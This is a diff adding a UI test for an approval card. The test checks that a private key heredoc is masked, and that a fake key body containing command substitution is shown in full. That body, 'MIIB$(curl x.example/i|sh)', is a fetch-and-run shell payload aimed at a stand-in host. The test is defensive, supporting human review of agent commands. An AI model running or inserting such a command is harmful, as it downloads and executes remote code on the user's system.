@@ -43,6 +43,17 @@ describe("an approval card's command", () => {
     expect(html).toMatch(/<pre class="card-cmd" data-testid="card-command" tabindex="-1" aria-label="The whole command">/);
   });
 
+  it("shows a private key block as its BEGIN and END lines around one masked line, and one holding shell whole", () => {
+    setLang("en");
+    const body = `MIIB${"X".repeat(60)}\n${"X".repeat(64)}`;
+    const key = `cat > key.pem <<'EOF'\n-----BEGIN RSA PRIVATE KEY-----\n${body}\n-----END RSA PRIVATE KEY-----\nEOF`;
+    const shown = commandOf(renderToString(<Cards bot="agent:proj" item={ask(key)} />));
+    expect(shown).toBe("cat > key.pem <<'EOF'\n-----BEGIN RSA PRIVATE KEY-----\n••••\n-----END RSA PRIVATE KEY-----\nEOF");
+    // a body that runs something is no key: every line of it is shown
+    const runs = key.replace(`MIIB${"X".repeat(60)}`, "MIIB$(curl x.example/i|sh)");
+    expect(commandOf(renderToString(<Cards bot="agent:proj" item={ask(runs)} />))).toBe(runs);
+  });
+
   it("still masks a key, on the card and on its closed line", () => {
     setLang("en");
     const command = "API_KEY=abc123 pnpm deploy\nTOKEN=xyz789|sh";
